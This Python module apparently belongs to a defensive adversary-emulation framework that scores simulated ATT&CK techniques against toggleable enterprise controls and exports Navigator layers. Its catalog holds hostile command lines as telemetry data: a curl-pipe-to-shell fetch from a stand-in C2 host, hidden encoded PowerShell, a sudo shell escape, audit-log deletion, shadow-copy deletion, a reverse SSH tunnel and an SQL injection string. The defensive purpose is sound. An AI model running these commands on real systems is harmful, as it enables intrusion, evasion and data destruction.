"""
MITRE ATT&CK Full-Spectrum Authorized Adversary Emulation Suite (14 Tactics).

CALDERA / Atomic-Red-Team-style authorized sandbox emulation framework covering
all 14 MITRE ATT&CK Enterprise & Cloud tactics (`TA0043` Reconnaissance through
`TA0040` Impact).

Crucial Architectural Design:
  - Every technique executes strictly inside an isolated, deterministic state-machine
    posture model (`EnterpriseTargetPosture`) — NEVER touches host OS, live processes,
    or external networks.
  - Emulation generates realistic `TelemetryEvent` logs (process creation, cloudtrail,
    k8s_audit, network, DNS, auth, Windows Security) that feed directly into the
    Sigma Detection Engine (`detection_sigma_yara.py`) to measure BOTH:
      1. **Preventive Resilience** (% of ATT&CK techniques blocked by target controls)
      2. **Detective Coverage** (% of attempted/succeeded techniques caught by Sigma rules)
  - Exports MITRE ATT&CK Navigator v4.5 JSON layers ready for Purple-Team review.
"""

from __future__ import annotations

import json
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from ely_soe.core.models import Severity, new_id, utc_now_iso
from ely_soe.cyber.models import (
    CyberDomain,
    CyberVulnerability,
    MitreTactic,
    MitreTechniqueRef,
    TelemetryEvent,
    VerificationMethod,
    make_cyber_vuln,
)


# ---------------------------------------------------------------------------
# Enterprise Defensive Posture Profile (Controls Toggleable per Target)
# ---------------------------------------------------------------------------

@dataclass
class EnterpriseDefensePosture:
    """Models preventive security controls across an enterprise/cloud/agent environment."""

    name: str = "enterprise_default"
    waf_and_input_validation: bool = False
    mfa_and_phishing_resistant_auth: bool = False
    edr_script_and_process_blocking: bool = False
    least_privilege_iam_and_ad_tiering: bool = False
    container_restricted_pss: bool = False
    credential_guard_and_imdsv2: bool = False
    microsegmentation_and_egress_filtering: bool = False
    immutable_audit_and_tamper_protection: bool = False
    dlp_and_dns_tunnel_blocking: bool = False
    immutable_offline_backups: bool = False
    supply_chain_sha_pinning: bool = False
    network_smb_ldap_signing: bool = False

    @classmethod
    def vulnerable_baseline(cls) -> "EnterpriseDefensePosture":
        return cls(name="vulnerable_unhardened_v0.9")

    @classmethod
    def hardened_enterprise(cls) -> "EnterpriseDefensePosture":
        return cls(
            name="hardened_zero_trust_v1.0",
            waf_and_input_validation=True,
            mfa_and_phishing_resistant_auth=True,
            edr_script_and_process_blocking=True,
            least_privilege_iam_and_ad_tiering=True,
            container_restricted_pss=True,
            credential_guard_and_imdsv2=True,
            microsegmentation_and_egress_filtering=True,
            immutable_audit_and_tamper_protection=True,
            dlp_and_dns_tunnel_blocking=True,
            immutable_offline_backups=True,
            supply_chain_sha_pinning=True,
            network_smb_ldap_signing=True,
        )


# ---------------------------------------------------------------------------
# Atomic MITRE ATT&CK Emulation Technique Catalog (36 Techniques across 14 Tactics)
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class AttackEmulationTechnique:
    technique_id: str
    name: str
    tactic: MitreTactic
    severity: Severity
    required_control_attr: str
    log_source: str
    emulated_event_fields: Dict[str, Any]
    description: str
    remediation: str


MITRE_EMULATION_CATALOG: Tuple[AttackEmulationTechnique, ...] = (
    # 1. Reconnaissance (TA0043)
    AttackEmulationTechnique(
        technique_id="T1595.002",
        name="Active Scanning: Vulnerability Scanning",
        tactic=MitreTactic.RECONNAISSANCE,
        severity=Severity.LOW,
        required_control_attr="waf_and_input_validation",
        log_source="web_access",
        emulated_event_fields={"http_method": "GET", "uri": "/.env", "user_agent": "nuclei-scanner/3.2", "status": 200},
        description="Automated external reconnaissance probing exposed `.env`, `.git`, and swagger metadata endpoints.",
        remediation="Block hidden dotfile routes at reverse proxy and deploy adaptive WAF rate limiting.",
    ),
    AttackEmulationTechnique(
        technique_id="T1590.002",
        name="Gather Victim Network Information: DNS Zone Enumeration",
        tactic=MitreTactic.RECONNAISSANCE,
        severity=Severity.MEDIUM,
        required_control_attr="microsegmentation_and_egress_filtering",
        log_source="dns",
        emulated_event_fields={"qtype": "AXFR", "qname": "corp.internal", "response_code": "NOERROR"},
        description="External DNS AXFR zone transfer request exposing internal service topology.",
        remediation="Restrict AXFR strictly to TSIG-authenticated secondary nameservers.",
    ),
    # 2. Resource Development (TA0042)
    AttackEmulationTechnique(
        technique_id="T1587.001",
        name="Develop Capabilities: Malicious Package / Typosquat Dependency Staging",
        tactic=MitreTactic.RESOURCE_DEVELOPMENT,
        severity=Severity.HIGH,
        required_control_attr="supply_chain_sha_pinning",
        log_source="process_creation",
        emulated_event_fields={"image": "/usr/bin/pip", "command_line": "pip install reqeusts-auth --extra-index-url http://untrusted.invalid/simple"},
        description="Unpinned dependency installation from untrusted external package index.",
        remediation="Enforce hash-pinned lockfiles and private curated artifact registries.",
    ),
    # 3. Initial Access (TA0001)
    AttackEmulationTechnique(
        technique_id="T1190",
        name="Exploit Public-Facing Application (SQLi / SSTI / Deser)",
        tactic=MitreTactic.INITIAL_ACCESS,
        severity=Severity.CRITICAL,
        required_control_attr="waf_and_input_validation",
        log_source="web_access",
        emulated_event_fields={"http_method": "POST", "uri": "/api/search", "body_sample": "' UNION SELECT username,password FROM users--", "status": 200},
        description="Exploitation of public-facing web/API injection endpoint for initial foothold.",
        remediation="Parameterize all queries, enforce strict schema validation, and deploy WAF virtual patching.",
    ),
    AttackEmulationTechnique(
        technique_id="T1195.002",
        name="Supply Chain Compromise: CI/CD Workflow Poisoning",
        tactic=MitreTactic.INITIAL_ACCESS,
        severity=Severity.CRITICAL,
        required_control_attr="supply_chain_sha_pinning",
        log_source="cloudtrail",
        emulated_event_fields={"event_name": "GitHubActionsWorkflowRun", "trigger": "pull_request_target", "action_ref": "thirdparty/setup@main"},
        description="Compromised unpinned third-party CI action executing in privileged workflow context.",
        remediation="Pin all CI actions by immutable 40-char commit SHA and forbid untrusted checkout in `pull_request_target`.",
    ),
    AttackEmulationTechnique(
        technique_id="T1078.004",
        name="Valid Accounts: Cloud Accounts Without Phishing-Resistant MFA",
        tactic=MitreTactic.INITIAL_ACCESS,
        severity=Severity.HIGH,
        required_control_attr="mfa_and_phishing_resistant_auth",
        log_source="cloudtrail",
        emulated_event_fields={"event_name": "ConsoleLogin", "mfa_used": "No", "source_ip": "198.51.100.77", "result": "Success"},
        description="Credential stuffing / stolen password login succeeding on cloud console without MFA.",
        remediation="Mandate FIDO2/WebAuthn phishing-resistant MFA and conditional access policies.",
    ),
    # 4. Execution (TA0002)
    AttackEmulationTechnique(
        technique_id="T1059.004",
        name="Command and Scripting Interpreter: Unix Shell Injection",
        tactic=MitreTactic.EXECUTION,
        severity=Severity.CRITICAL,
        required_control_attr="edr_script_and_process_blocking",
        log_source="process_creation",
        emulated_event_fields={"parent_image": "/usr/bin/python3", "image": "/bin/sh", "command_line": "sh -c curl http://c2.invalid/stage.sh | sh"},
        description="Web/agent worker process spawning interactive shell to execute remote staged script.",
        remediation="Disable `shell=True`, apply seccomp-bpf execve allowlists, and block script-pipe execution via EDR.",
    ),
    AttackEmulationTechnique(
        technique_id="T1059.001",
        name="Command and Scripting Interpreter: Encoded PowerShell Execution",
        tactic=MitreTactic.EXECUTION,
        severity=Severity.HIGH,
        required_control_attr="edr_script_and_process_blocking",
        log_source="process_creation",
        emulated_event_fields={"image": "powershell.exe", "command_line": "powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgA..."},
        description="Obfuscated Base64 encoded PowerShell payload execution.",
        remediation="Enable Constrained Language Mode, AMSI/Script Block Logging, and signed script execution policy.",
    ),
    AttackEmulationTechnique(
        technique_id="T1609",
        name="Container Administration Command (`kubectl exec` Lateral Execution)",
        tactic=MitreTactic.EXECUTION,
        severity=Severity.HIGH,
        required_control_attr="container_restricted_pss",
        log_source="k8s_audit",
        emulated_event_fields={"verb": "create", "resource": "pods/exec", "namespace": "production", "user": "system:serviceaccount:dev:builder"},
        description="Unauthorized `pods/exec` command invocation into production Kubernetes pod.",
        remediation="Remove `pods/exec` from workload RBAC roles and alert on all interactive prod container shells.",
    ),
    # 5. Persistence (TA0003)
    AttackEmulationTechnique(
        technique_id="T1098.001",
        name="Account Manipulation: Additional Cloud Access Key Creation",
        tactic=MitreTactic.PERSISTENCE,
        severity=Severity.CRITICAL,
        required_control_attr="least_privilege_iam_and_ad_tiering",
        log_source="cloudtrail",
        emulated_event_fields={"event_name": "CreateAccessKey", "target_user": "prod-admin", "actor": "compromised-dev"},
        description="Attacker minting secondary long-lived IAM access keys for persistence.",
        remediation="Forbid cross-user `CreateAccessKey` via SCP and migrate completely to short-lived STS/OIDC federation.",
    ),
    AttackEmulationTechnique(
        technique_id="T1053.003",
        name="Scheduled Task/Job: Cron Persistence",
        tactic=MitreTactic.PERSISTENCE,
        severity=Severity.HIGH,
        required_control_attr="edr_script_and_process_blocking",
        log_source="process_creation",
        emulated_event_fields={"image": "/usr/bin/crontab", "command_line": "echo '* * * * * /tmp/.beacon' | crontab -"},
        description="Persistence established via user/system crontab entry pointing to `/tmp`.",
        remediation="Use read-only rootfs in containers, restrict cron to root, and monitor `/var/spool/cron` writes.",
    ),
    AttackEmulationTechnique(
        technique_id="T1525",
        name="Implant Internal Image / Backdoor Lambda Function",
        tactic=MitreTactic.PERSISTENCE,
        severity=Severity.HIGH,
        required_control_attr="supply_chain_sha_pinning",
        log_source="cloudtrail",
        emulated_event_fields={"event_name": "UpdateFunctionCode20150331v2", "function_name": "prod-billing-worker", "unsigned": True},
        description="Silent code overwrite on serverless function or container image tag without cryptographic signing.",
        remediation="Enforce AWS Lambda Code Signing / Cosign admission verification.",
    ),
    # 6. Privilege Escalation (TA0004)
    AttackEmulationTechnique(
        technique_id="T1611",
        name="Escape to Host via Privileged Container / HostPath Mount",
        tactic=MitreTactic.PRIVILEGE_ESCALATION,
        severity=Severity.CRITICAL,
        required_control_attr="container_restricted_pss",
        log_source="k8s_audit",
        emulated_event_fields={"verb": "create", "resource": "pods", "privileged": True, "host_path": "/var/run/docker.sock"},
        description="Deployment of privileged container mounting host root/socket to escalate to Kubernetes node root.",
        remediation="Enforce Kubernetes Pod Security Admission `restricted` profile across all namespaces.",
    ),
    AttackEmulationTechnique(
        technique_id="T1098.003",
        name="Additional Cloud Roles: `AttachRolePolicy` AdministratorAccess",
        tactic=MitreTactic.PRIVILEGE_ESCALATION,
        severity=Severity.CRITICAL,
        required_control_attr="least_privilege_iam_and_ad_tiering",
        log_source="cloudtrail",
        emulated_event_fields={"event_name": "AttachRolePolicy", "policy_arn": "arn:aws:iam::aws:policy/AdministratorAccess"},
        description="Self-escalation by attaching AWS `AdministratorAccess` managed policy.",
        remediation="Enforce IAM Permissions Boundaries and block policy mutations outside CI/CD pipelines.",
    ),
    AttackEmulationTechnique(
        technique_id="T1548.001",
        name="Abuse Elevation Control Mechanism: Setuid / Sudo Escalation",
        tactic=MitreTactic.PRIVILEGE_ESCALATION,
        severity=Severity.HIGH,
        required_control_attr="edr_script_and_process_blocking",
        log_source="process_creation",
        emulated_event_fields={"image": "/usr/bin/sudo", "command_line": "sudo -u root /usr/bin/find . -exec /bin/sh \\;"},
        description="GTFOBins sudo binary breakout to root shell.",
        remediation="Eliminate wildcard/GTFOBins NOPASSWD sudo rules and set `no_new_privs`.",
    ),
    # 7. Defense Evasion (TA0005)
    AttackEmulationTechnique(
        technique_id="T1562.008",
        name="Impair Defenses: Disable CloudTrail / Audit Logging",
        tactic=MitreTactic.DEFENSE_EVASION,
        severity=Severity.CRITICAL,
        required_control_attr="immutable_audit_and_tamper_protection",
        log_source="cloudtrail",
        emulated_event_fields={"event_name": "StopLogging", "trail_name": "org-security-trail"},
        description="Attempt to stop CloudTrail logging or delete forensic audit logs prior to lateral movement.",
        remediation="Deny `cloudtrail:StopLogging`/`DeleteTrail` via Organization SCP and stream logs to immutable WORM vault.",
    ),
    AttackEmulationTechnique(
        technique_id="T1070.002",
        name="Indicator Removal: Clear Linux / Application Audit Logs",
        tactic=MitreTactic.DEFENSE_EVASION,
        severity=Severity.HIGH,
        required_control_attr="immutable_audit_and_tamper_protection",
        log_source="process_creation",
        emulated_event_fields={"image": "/bin/rm", "command_line": "rm -rf /var/log/auth.log /var/log/audit/audit.log"},
        description="Deletion or truncation of host authentication and audit logs.",
        remediation="Forward logs in real time to an append-only remote SIEM/Merkle ledger isolated from workloads.",
    ),
    # 8. Credential Access (TA0006)
    AttackEmulationTechnique(
        technique_id="T1552.005",
        name="Unsecured Credentials: Cloud Instance Metadata API (IMDSv1 SSRF)",
        tactic=MitreTactic.CREDENTIAL_ACCESS,
        severity=Severity.CRITICAL,
        required_control_attr="credential_guard_and_imdsv2",
        log_source="network_connection",
        emulated_event_fields={"dst_ip": "169.254.169.254", "dst_port": 80, "uri": "/latest/meta-data/iam/security-credentials/", "imds_token_header": False},
        description="Harvesting IAM STS temporary credentials via legacy IMDSv1 endpoint.",
        remediation="Mandate IMDSv2 (`HttpTokens=required`, `HopLimit=1`) and block metadata IP in egress policies.",
    ),
    AttackEmulationTechnique(
        technique_id="T1003.001",
        name="OS Credential Dumping: LSASS Memory Read",
        tactic=MitreTactic.CREDENTIAL_ACCESS,
        severity=Severity.CRITICAL,
        required_control_attr="credential_guard_and_imdsv2",
        log_source="windows_security",
        emulated_event_fields={"event_id": 10, "target_image": "C:\\Windows\\System32\\lsass.exe", "granted_access": "0x1010", "source_image": "C:\\Temp\\procdump.exe"},
        description="Process memory read against `lsass.exe` to extract NTLM hashes and Kerberos tickets.",
        remediation="Enable Credential Guard, RunAsPPL (LSA Protection), and block non-system handles to `lsass.exe`.",
    ),
    AttackEmulationTechnique(
        technique_id="T1558.003",
        name="Steal or Forge Kerberos Tickets: Kerberoasting SPN Tickets",
        tactic=MitreTactic.CREDENTIAL_ACCESS,
        severity=Severity.HIGH,
        required_control_attr="least_privilege_iam_and_ad_tiering",
        log_source="windows_security",
        emulated_event_fields={"event_id": 4769, "ticket_encryption_type": "0x17", "service_name": "MSSQLSvc/db01.corp.local"},
        description="Bulk RC4 (0x17) Kerberos TGS ticket requests for offline password cracking.",
        remediation="Disable RC4 Kerberos encryption, migrate SPNs to gMSAs, and monitor Event 4769 with 0x17.",
    ),
    AttackEmulationTechnique(
        technique_id="T1649",
        name="Steal or Forge Authentication Certificates (ADCS ESC1)",
        tactic=MitreTactic.CREDENTIAL_ACCESS,
        severity=Severity.CRITICAL,
        required_control_attr="least_privilege_iam_and_ad_tiering",
        log_source="windows_security",
        emulated_event_fields={"event_id": 4886, "template": "SubCA-UserAuth", "san_upn": "administrator@corp.local"},
        description="Certificate enrollment requesting forged Domain Admin UPN in SAN extension.",
        remediation="Harden ADCS templates to disable enrollee-supplied SAN and enforce manager approval.",
    ),
    AttackEmulationTechnique(
        technique_id="T1003.006",
        name="OS Credential Dumping: DCSync Directory Replication",
        tactic=MitreTactic.CREDENTIAL_ACCESS,
        severity=Severity.CRITICAL,
        required_control_attr="least_privilege_iam_and_ad_tiering",
        log_source="windows_security",
        emulated_event_fields={"event_id": 4662, "properties": "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2", "actor": "svc_backup"},
        description="Non-DC principal invoking `DS-Replication-Get-Changes-All` to dump domain password hashes.",
        remediation="Revoke replication rights from all non-DC principals and alert immediately on Event 4662 replication GUIDs.",
    ),
    # 9. Discovery (TA0007)
    AttackEmulationTechnique(
        technique_id="T1580",
        name="Cloud Infrastructure Discovery (Bulk IAM/S3/EC2 Enumeration)",
        tactic=MitreTactic.DISCOVERY,
        severity=Severity.MEDIUM,
        required_control_attr="least_privilege_iam_and_ad_tiering",
        log_source="cloudtrail",
        emulated_event_fields={"event_name": "ListSecrets", "burst_calls_1m": 48, "actor": "web-worker-role"},
        description="Compromised workload role enumerating Secrets Manager, IAM roles, and S3 buckets.",
        remediation="Deny wildcard `Describe*`/`List*` permissions on runtime workload roles.",
    ),
    AttackEmulationTechnique(
        technique_id="T1613",
        name="Container and Resource Discovery (K8s Secrets Enumeration)",
        tactic=MitreTactic.DISCOVERY,
        severity=Severity.HIGH,
        required_control_attr="container_restricted_pss",
        log_source="k8s_audit",
        emulated_event_fields={"verb": "list", "resource": "secrets", "namespace": "kube-system", "user": "system:serviceaccount:app:default"},
        description="Pod attempting cluster-wide Kubernetes Secret listing via mounted ServiceAccount JWT.",
        remediation="Set `automountServiceAccountToken: false` and apply least-privilege RBAC.",
    ),
    # 10. Lateral Movement (TA0008)
    AttackEmulationTechnique(
        technique_id="T1021.002",
        name="Remote Services: SMB / Admin Share Lateral Movement & NTLM Relay",
        tactic=MitreTactic.LATERAL_MOVEMENT,
        severity=Severity.HIGH,
        required_control_attr="network_smb_ldap_signing",
        log_source="network_connection",
        emulated_event_fields={"dst_port": 445, "protocol": "smb", "smb_signing": False, "share": "\\\\srv-app02\\ADMIN$"},
        description="Lateral pivot over unsigned SMB admin shares using relayed/stolen NTLM credentials.",
        remediation="Enforce SMB signing everywhere, disable NTLMv1, and block workstation-to-workstation port 445.",
    ),
    AttackEmulationTechnique(
        technique_id="T1550.003",
        name="Use Alternate Authentication Material: Pass the Ticket (Kerberos)",
        tactic=MitreTactic.LATERAL_MOVEMENT,
        severity=Severity.HIGH,
        required_control_attr="least_privilege_iam_and_ad_tiering",
        log_source="auth",
        emulated_event_fields={"auth_protocol": "kerberos", "ticket_source_mismatch": True, "target_host": "dc01.corp.local"},
        description="Replaying harvested Kerberos TGT from a different workstation IP to access Tier-0 server.",
        remediation="Enforce AD Tier-0 silos, Kerberos Armoring (FAST), and Protected Users group.",
    ),
    # 11. Collection (TA0009)
    AttackEmulationTechnique(
        technique_id="T1530",
        name="Data from Cloud Storage Object (Bulk S3/GCS Bucket Extraction)",
        tactic=MitreTactic.COLLECTION,
        severity=Severity.HIGH,
        required_control_attr="dlp_and_dns_tunnel_blocking",
        log_source="cloudtrail",
        emulated_event_fields={"event_name": "GetObject", "bucket": "prod-customer-pii-vault", "objects_downloaded_5m": 1450},
        description="High-volume bulk read of sensitive customer storage objects from anomalous principal.",
        remediation="Enforce VPC Endpoint bucket policies, KMS key policies, and S3 Macie/DLP anomaly throttling.",
    ),
    # 12. Command and Control (TA0011)
    AttackEmulationTechnique(
        technique_id="T1071.004",
        name="Application Layer Protocol: High-Entropy DNS C2 Beaconing",
        tactic=MitreTactic.COMMAND_AND_CONTROL,
        severity=Severity.HIGH,
        required_control_attr="dlp_and_dns_tunnel_blocking",
        log_source="dns",
        emulated_event_fields={"qtype": "TXT", "qname": "a8f91c2b7e409d11aa22ff0981bc7721.c2-beacon.invalid", "entropy": 4.21},
        description="Covert bidirectional C2 channel encoded inside high-entropy DNS TXT subdomains.",
        remediation="Inspect all egress DNS through RPZ/entropy-blocking resolvers and deny direct UDP/53 egress.",
    ),
    AttackEmulationTechnique(
        technique_id="T1572",
        name="Protocol Tunneling: Reverse SSH / SOCKS Proxy Pivot",
        tactic=MitreTactic.COMMAND_AND_CONTROL,
        severity=Severity.HIGH,
        required_control_attr="microsegmentation_and_egress_filtering",
        log_source="process_creation",
        emulated_event_fields={"image": "/usr/bin/ssh", "command_line": "ssh -N -R 9050:localhost:22 tunnel@198.51.100.99"},
        description="Outbound reverse SSH tunnel bypassing perimeter ingress firewalls.",
        remediation="Enforce default-deny egress firewalls allowing only explicit HTTPS proxies and block outbound SSH.",
    ),
    # 13. Exfiltration (TA0010)
    AttackEmulationTechnique(
        technique_id="T1567.002",
        name="Exfiltration Over Web Service: Cloud Storage Upload to External Bucket",
        tactic=MitreTactic.EXFILTRATION,
        severity=Severity.CRITICAL,
        required_control_attr="dlp_and_dns_tunnel_blocking",
        log_source="network_connection",
        emulated_event_fields={"dst_host": "attacker-drop.s3.amazonaws.com", "bytes_out": 524288000, "http_method": "PUT"},
        description="Large outbound upload of sensitive database dump to an unauthorized external cloud bucket.",
        remediation="Enforce `aws:ResourceOrgID` VPC Endpoint egress policies and inline DLP inspection.",
    ),
    # 14. Impact (TA0040)
    AttackEmulationTechnique(
        technique_id="T1486",
        name="Data Encrypted for Impact (Ransomware Mass Encryption Emulation)",
        tactic=MitreTactic.IMPACT,
        severity=Severity.CRITICAL,
        required_control_attr="immutable_offline_backups",
        log_source="process_creation",
        emulated_event_fields={"image": "/usr/local/bin/cryptor", "command_line": "cryptor --encrypt-all /data/prod --ext .locked", "files_modified_10s": 420},
        description="Rapid mass file encryption and extension renaming consistent with ransomware impact.",
        remediation="Maintain air-gapped/WORM immutable backups, EDR behavioral ransomware kill-switches, and least-privilege share mounts.",
    ),
    AttackEmulationTechnique(
        technique_id="T1490",
        name="Inhibit System Recovery (Volume Shadow Copy / Backup Snapshot Deletion)",
        tactic=MitreTactic.IMPACT,
        severity=Severity.CRITICAL,
        required_control_attr="immutable_offline_backups",
        log_source="process_creation",
        emulated_event_fields={"image": "vssadmin.exe", "command_line": "vssadmin.exe delete shadows /all /quiet"},
        description="Attempt to destroy local/cloud snapshots and recovery backups before impact execution.",
        remediation="Protect backup vaults with S3 Object Lock Compliance Mode / AWS Backup Vault Lock + multi-party approval.",
    ),
)


class MitreAttackEmulationEngine:
    """
    Executes authorized MITRE ATT&CK adversary emulation campaigns across all 14 tactics,
    emitting findings for unblocked techniques, telemetry events for Sigma evaluation,
    and MITRE ATT&CK Navigator v4.5 JSON layers.
    """

    def run_campaign(
        self,
        posture: EnterpriseDefensePosture,
        tactics_filter: Optional[List[MitreTactic]] = None,
    ) -> Dict[str, Any]:
        """Run full 14-tactic emulation against a target posture and return results + telemetry."""
        selected = [
            t for t in MITRE_EMULATION_CATALOG
            if tactics_filter is None or t.tactic in tactics_filter
        ]

        technique_results: List[Dict[str, Any]] = []
        telemetry_events: List[TelemetryEvent] = []
        findings: List[CyberVulnerability] = []
        tactic_stats: Dict[str, Dict[str, int]] = {}

        blocked_count = 0
        succeeded_count = 0

        for tech in selected:
            control_active = bool(getattr(posture, tech.required_control_attr, False))
            t_key = tech.tactic.name.lower()
            tactic_stats.setdefault(t_key, {"total": 0, "blocked": 0, "succeeded": 0})
            tactic_stats[t_key]["total"] += 1

            # Emit telemetry event regardless so Blue-Team Sigma detection can score visibility
            ev = TelemetryEvent(
                event_id=new_id("evt"),
                timestamp=utc_now_iso(),
                log_source=tech.log_source,
                host=f"sim-node-{posture.name}",
                actor="emulated-adversary",
                fields={
                    **tech.emulated_event_fields,
                    "mitre_technique": tech.technique_id,
                    "blocked_by_control": control_active,
                },
            )
            telemetry_events.append(ev)

            if control_active:
                blocked_count += 1
                tactic_stats[t_key]["blocked"] += 1
                outcome = "BLOCKED"
            else:
                succeeded_count += 1
                tactic_stats[t_key]["succeeded"] += 1
                outcome = "SUCCEEDED"
                findings.append(
                    make_cyber_vuln(
                        rule_id=f"CYB-ATTACK-{tech.technique_id.replace('.', '_')}",
                        title=f"ATT&CK Emulation Succeeded: {tech.technique_id} — {tech.name}",
                        description=(
                            f"Authorized emulation of `{tech.technique_id}` ({tech.tactic.name}) succeeded against "
                            f"`{posture.name}` because control `{tech.required_control_attr}` is disabled. {tech.description}"
                        ),
                        cyber_domain=CyberDomain.ADVERSARY_EMULATION,
                        severity=tech.severity,
                        cwe_ids=["CWE-284", "CWE-693"],
                        confidence=0.96,
                        mitre_techniques=[MitreTechniqueRef(tech.technique_id, tech.name, tech.tactic)],
                        verification_method=VerificationMethod.EMULATION_PLAYBOOK,
                        sandbox_reproduced=True,
                        endpoint_or_asset=f"attack:{tech.tactic.value}/{tech.technique_id}",
                        remediation_guidance=tech.remediation,
                        discovered_by="ely_cyber_attack_emulator",
                    )
                )

            technique_results.append(
                {
                    "technique_id": tech.technique_id,
                    "name": tech.name,
                    "tactic_id": tech.tactic.value,
                    "tactic": t_key,
                    "severity": tech.severity.value,
                    "control_checked": tech.required_control_attr,
                    "outcome": outcome,
                    "telemetry_event_id": ev.event_id,
                }
            )

        total = len(selected)
        prevention_rate = round((blocked_count / total) * 100.0, 2) if total else 100.0

        return {
            "posture_name": posture.name,
            "tactics_covered": len(tactic_stats),
            "techniques_executed": total,
            "blocked_count": blocked_count,
            "succeeded_count": succeeded_count,
            "prevention_rate_pct": prevention_rate,
            "tactic_breakdown": tactic_stats,
            "technique_results": technique_results,
            "telemetry_events": telemetry_events,
            "findings": findings,
        }

    def export_attack_navigator_layer(self, campaign_result: Dict[str, Any]) -> str:
        """Export a MITRE ATT&CK Navigator v4.5 JSON heatmap layer from emulation results."""
        techniques = []
        for r in campaign_result.get("technique_results", []):
            blocked = r["outcome"] == "BLOCKED"
            techniques.append(
                {
                    "techniqueID": r["technique_id"],
                    "tactic": r["tactic"].replace("_", "-"),
                    "color": "#22c55e" if blocked else "#ef4444",
                    "score": 100 if blocked else 0,
                    "comment": f"Control `{r['control_checked']}`: {r['outcome']}",
                    "enabled": True,
                }
            )
        layer = {
            "name": f"ELY Cyber Emulation — {campaign_result.get('posture_name', 'target')}",
            "versions": {"attack": "15", "navigator": "4.9.1", "layer": "4.5"},
            "domain": "enterprise-attack",
            "description": (
                f"Prevention Rate: {campaign_result.get('prevention_rate_pct', 0)}% "
                f"({campaign_result.get('blocked_count', 0)}/{campaign_result.get('techniques_executed', 0)} blocked)"
            ),
            "techniques": techniques,
        }
        return json.dumps(layer, indent=2)
